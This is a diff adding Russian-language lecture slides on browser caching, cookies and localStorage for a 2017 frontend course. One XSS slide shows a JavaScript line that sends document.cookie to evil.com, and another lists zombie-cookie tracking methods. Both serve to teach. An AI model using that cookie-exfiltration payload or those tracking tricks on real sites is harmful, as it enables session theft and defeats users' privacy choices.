@@ -34,25 +34,413 @@
 
 	<link rel="stylesheet" href="/lib/hljs/styles/github.css">
 
+	<style>
+		.slide pre {
+			font-size: 110%;
+		}
+	</style>
+
 </head>
 <body class="shower list">
 
 	<header class="caption">
-		<h1>Заголовок презентации</h1>
+		<h1>Работа с данными в браузере</h1>
 		<p>Технопарк, 2017 г.</p>
 	</header>
 
 	<section class="slide">
-		<h2 class="shout">Заголовок первого слайда<br/>
+		<h2 class="shout">Работа с данными в браузере<br/>
 			<small style="font-size:32px;">Слайды доступны по ссылке <a href="http://frontend.tech-mail.ru/">frontend.tech-mail.ru</a></small>
 		</h2>
 	</section>
 
 	<section class="slide">
-		<h2>Заголовок слайда</h2>
-		<p>Цель нашего курса достаточно амбициозна: мы хотим, чтобы после его прохождения у вас появились необходимые навыки
-			и знания для самостоятельной разработки современных веб-приложений.</p>
-		<p class="note">JavaScript &mdash; основной инструмент frontend-разработчика.</p>
+		<h2 class="shout"><span style="font-size: 90%">Кэширование, cookies, хранение данных</span></h2>
+	</section>
+
+	<section class="slide question">
+		<h2>Кэширование</h2>
+	</section>
+
+	<section class="slide">
+		<h2>Кэширование</h2>
+		<div style="position:relative;width: 100%; height: 75%;"><img class="place" src="cache.jpg" style="transform-origin: center;transform: translate(-50%,-45%) scale(1);"></div>
+	</section>
+
+	<section class="slide">
+		<h2>Кэширование</h2>
+		<blockquote>
+			<p class="small-content"><b>Кэширование</b> &mdash; повторное использование ресурсов для работы приложения. Использование кэшей позволяет уменьшить задержку и расходование сетевого трафика и тем самым уменьшить время, необходимое для отображения ресурса. <b>HTTP-кэширование</b> &mdash; кэширование ответов на HTTP-запросы</p>
+		</blockquote>
+	</section>
+
+	<section class="slide">
+		<h2>Кэширование</h2>
+		<pre class="hljs http">
+			<code><span class="comment rus">// Запрос обыкновенный</span></code>
+			<code>GET /script.js HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code>Accept: */*</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Кэширование</h2>
+		<pre class="hljs http">
+			<code><span class="comment rus">// Ответ на запрос</span></code>
+			<code>HTTP/1.1 200 OK</code>
+			<code>Content-Type: application/javascript; charset=UTF-8</code>
+			<code>Cache-Control: public, max-age=86400</code>
+			<code>Last-Modified: Sat, 25 Mar 2017 12:00:00 GMT</code>
+			<code>ETag: W/"7349b-15b075b6d60"</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2><code>Cache-Control</code></h2>
+		<p>Возможные значения</p>
+		<ul lang="ru">
+			<li><code>no-cache</code></li>
+			<li><code>no-store</code></li>
+			<li><code>must-revalidate</code></li>
+			<li><code>private/public</code></li>
+			<li><code>max-age=31536000</code></li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>Проверка "свежести"</h2>
+		<pre class="hljs http">
+			<code><span class="comment rus">// Ответ на запрос</span></code>
+			<code>HTTP/1.1 200 OK</code>
+			<code>...</code>
+			<code>Last-Modified: Sat, 25 Mar 2017 12:00:00 GMT</code>
+			<code>...</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Проверка "свежести"</h2>
+		<pre class="hljs http">
+			<code>GET /script.js HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code>If-Modified-Since: Sat, 25 Mar 2017 12:00:00 GMT</code>
+			<code> </code>
+		</pre>
+		<pre class="hljs http">
+			<code>HTTP/1.1 304 Not Modified   <span class="comment rus">// Контент не изменился</span></code>
+			<code>HTTP/1.1 200 OK             <span class="comment rus">// Новый контент</span></code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Проверка <mark><em>валидности</em></mark></h2>
+		<pre class="hljs http">
+			<code><span class="comment rus">// Ответ на запрос</span></code>
+			<code>HTTP/1.1 200 OK</code>
+			<code>...</code>
+			<code>ETag: W/"7349b-15b075b6d60"</code>
+			<code>...</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Проверка <mark><em>валидности</em></mark></h2>
+		<pre class="hljs http">
+			<code>GET /script.js HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code>If-None-Match: W/"7349b-15b075b6d60"</code>
+			<code> </code>
+		</pre>
+		<pre class="hljs http">
+			<code>HTTP/1.1 304 Not Modified   <span class="comment rus">// Контент не изменился</span></code>
+			<code>HTTP/1.1 200 OK             <span class="comment rus">// Новый контент</span></code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide question">
+		<h2>Cookies</h2>
+	</section>
+
+	<section class="slide question">
+		<h2>HTTP is a stateless protocol</h2>
+	</section>
+
+	<section class="slide">
+		<h2>Cookies</h2>
+		<div>
+			<blockquote>
+				<p class="small-content"><b>Куки (cookies)</b> &mdash; небольшой фрагмент данных, отправленный веб-сервером и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса</p>
+			</blockquote>
+		</div>
+	</section>
+
+	<section class="slide">
+		<h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a> cookies</h2>
+		<p class="small-content"></p>
+		<ul lang="ru">
+			<li>Брайзер должен хранить как минимум 4096 байт кук</li>
+			<li>Минимум 20 шт. на домен</li>
+			<li>Минимум 300 шт. всего</li>
+			<li>Имена <mark>нечувствительны</mark> к регистру</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>1 Клиент → Сервер</h2>
+		<pre class="hljs http">
+			<code>GET / HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>2 Клиент ← Сервер</h2>
+		<pre class="hljs http">
+			<code>HTTP/1.1 200 OK</code>
+			<code><mark>Set-Cookie: name=value</mark></code>
+			<code>Content-Type: text/html</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>3 Клиент → Сервер</h2>
+		<pre class="hljs http">
+			<code>GET / HTTP/1.1</code>
+			<code>Host: example.com</code>
+			<code><mark>Cookie: name=value</mark></code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>4 Клиент ← Сервер</h2>
+		<pre class="hljs http">
+			<code>HTTP/1.1 200 OK</code>
+			<code><mark>Set-Cookie: name=value2</mark></code>
+			<code>Content-Type: text/html</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Использование</h2>
+		<p class="small-content"></p>
+		<ul lang="ru">
+			<li>Аутентификация пользователей</li>
+			<li>Хранение настроек пользователей</li>
+			<li>Отслеживание сеанса (сессия)</li>
+			<li>Сбор статистики</li>
+			<li>Проведение экспериментов</li>
+			<li>etc...</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>Set-Cookie</h2>
+		<pre class="hljs http">
+			<code>Set-Cookie: value</code>
+			<code>                 [;<span hidden>X:</span> Expires=date]</code>
+			<code>                 [;<span hidden>X:</span> Max-Age=age]</code>
+			<code>                 [;<span hidden>X:</span> Domain=domain]</code>
+			<code>                 [;<span hidden>X:</span> Path=path]</code>
+			<code>                 [;<span hidden>X:</span> Secure]</code>
+			<code>                 [;<span hidden>X:</span> HttpOnly]</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Cookie ID</h2>
+		<pre class="hljs http">
+			<code>Set-Cookie: name=v1; domain=.example.com; path=/</code>
+			<code>Set-Cookie: name=v2; domain=www.example.com; path=/</code>
+			<code>Set-Cookie: name=v3; domain=.example.com; path=/archive</code>
+			<code> </code>
+		</pre>
+		<pre class="hljs http">
+			<code>Cookie: name=v1; name=v2; name=v3</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>JavaScript</h2>
+		<p class="small-content"></p>
+		<pre class="hljs js">
+			<code>document.cookie; /* 'name1=value1' */</code>
+			<code class="next">document.cookie = 'name2=value2';</code>
+			<code class="next">document.cookie; /* 'name1=value1; name2=value2' */</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
+		<p class="small-content"></p>
+		<pre class="hljs js">
+			<code>(new Image()).src = 'http://evil.com/?cookie=' +</code>
+			<code>                    document.cookie;</code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Zombie Cookie</h2>
+		<div>
+			<p class="small-content"></p>
+			<img style="float:left" src="zombie.png">
+			<blockquote>
+				<p><b>What are Zombie Cookies?</b><br/>A zombie cookie is an HTTP cookie that returns to life automatically after being deleted by the user</p>
+			</blockquote>
+		</div>
+	</section>
+
+	<section class="slide">
+		<h2>Zombie Cookie</h2>
+		<div>
+			<ul>
+				<li>Storing cookies in and reading out web history</li>
+				<li>Storing cookies in HTTP ETags</li>
+				<li>Internet Explorer userData storage   (starting IE9, userData is no longer supported)</li>
+				<li>HTML5 Storage</li>
+				<li>Storing cookies in RGB values of auto-generated, force-cached PNGs using HTML5 Canvas tag to read pixels (cookies) back out</li>
+				<li>Local Shared Objects (Flash cookies)</li>
+				<li>Silverlight Isolated Storage</li>
+			</ul>
+		</div>
+	</section>
+
+	<section class="slide">
+		<h2>HSTS Cookie</h2>
+		<p class="small-content">
+			<a href="https://github.com/ben174/hsts-cookie">https://github.com/ben174/hsts-cookie</a>
+		</p>
+	</section>
+
+	<section class="slide question">
+		<h2>Хранение данных</h2>
+	</section>
+
+	<section class="slide">
+		<h2>Хранение данных</h2>
+		<p class="small-content"></p>
+		<ul lang="ru">
+			<li><code>localStorage</code></li>
+			<li><code>sessionStorage</code></li>
+			<li>WebSQL</li>
+			<li>IndexedDB</li>
+			<li>FileSystem</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2><code>window.localStorage</code></h2>
+		<p class="small-content"></p>
+		<pre class="hljs js">
+			<code>localStorage[key];         <span class="comment rus">/* String */</span></code>
+			<code>localStorage[key] = value; <span class="comment rus">/* String */</span></code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2><code>window.localStorage</code></h2>
+		<pre class="hljs js">
+			<code>localStorage.length</code>
+			<code>localStorage.key(i)          <span class="comment rus">/* String */</span></code>
+			<code>localStorage.getItem(key)    <span class="comment rus">/* String */</span></code>
+			<code>localStorage.setItem(key, value)</code>
+			<code>localStorage.removeItem(key)</code>
+			<code>localStorage.clear()</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Событие <code>storage</code></h2>
+		<pre class="hljs js">
+			<code>window.addEventListener('storage', function (e) {</code>
+			<code>    /* e.key, e.newValue */</code>
+			<code>    ...</code>
+			<code>});</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>JSON</h2>
+		<pre class="hljs js">
+			<code>function setJSON(key, value) {</code>
+			<code>    localStorage[key] = JSON.stringify(value);</code>
+			<code>}</code>
+			<code>function getJSON(key) {</code>
+			<code>    const value = localStorage[key];</code>
+			<code>    return value ? JSON.parse(value) : null;</code>
+			<code>}</code>
+			<code> </code>
+		</pre>
+	</section>
+
+	<section class="slide">
+		<h2>Хранение данных</h2>
+		<p class="small-content"></p>
+		<ul lang="ru">
+			<li>WebSQL &mdash; 5 MB</li>
+			<li>IndexedDB &mdash; 50 MB</li>
+			<li>FileSystem &mdash; <a href="https://www.w3.org/TR/FileAPI/" target="_blank">File API</a>
+				<ul>
+					<li><a href="http://www.adobe.com/devnet/archive/html5/articles/real-world-example-html5-filesystem-api.html" target="_blank">Пример</a></li>
+					<li><a href="http://www.htmlfivewow.com/demos/terminal/terminal.html" target="_blank">Терминал в браузере, работающий с файловой системой</a></li>
+				</ul>
+			</li>
+		</ul>
+	</section>
+
+
+
+
+
+	<section class="slide">
+		<h2 class="shout">Service Workers</h2>
+	</section>
+
+
+
+
+
+	<!--то самое-->
+
+	<section class="slide">
+		<h2>Кэширование</h2>
+		<pre class="hljs ">
+			<code><span class="comment rus">// Комментарий</span></code>
+
+		</pre>
+	</section>
+
+
+
+
+
+	<section class="slide">
+		<h2 class="shout">Протокол WebSocket</h2>
+	</section>
+
+
+
+
+
+
+	<section class="slide">
+		<h2 class="shout">HTTP/2</h2>
 	</section>
 
 
@@ -60,6 +448,7 @@
 	<section class="slide">
 		<h2>Полезные ссылки</h2>
 		<ul lang="en">
+			<li><a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=ru" target="_blank">Кэширование HTTP</a> &mdash; Google Developers</li>
 			<li><a href="" target="_blank">ССЫЛКА</a></li>
 		</ul>
 	</section>
